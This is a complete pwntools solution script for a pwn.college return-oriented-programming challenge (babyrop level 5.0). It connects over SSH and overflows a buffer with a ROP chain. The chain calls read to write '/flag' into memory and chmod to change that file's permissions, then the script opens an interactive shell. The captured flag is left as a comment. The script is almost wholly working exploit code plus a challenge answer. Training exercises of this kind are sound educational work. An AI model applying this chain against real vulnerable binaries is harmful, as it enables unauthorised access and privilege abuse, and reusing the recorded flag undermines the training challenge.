from pwn import *

elf = ELF("./babyrop_level5.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rax = 0x0000000000401849
pop_rdi = 0x0000000000401880
pop_rsi = 0x0000000000401868
pop_rdx = 0x0000000000401870
syscall = 0x0000000000401858
pos = elf.bss() + 0x100

io = s.process("/challenge/babyrop_level5.0")

chain =  b'a'*0x88
chain += p64(pop_rax) + p64(0)    + p64(pop_rdi) + p64(0)   + p64(pop_rsi) + p64(pos) + p64(pop_rdx) + p64(0x100) + p64(syscall)
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(pos) + p64(pop_rsi) + p64(7)   + p64(syscall)
io.send(chain)
io.send(b'/flag\x00')

io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{cd99A9Qpy94miTeEB7UI7tEYL-P.0VO0MDLxIjNyEzW}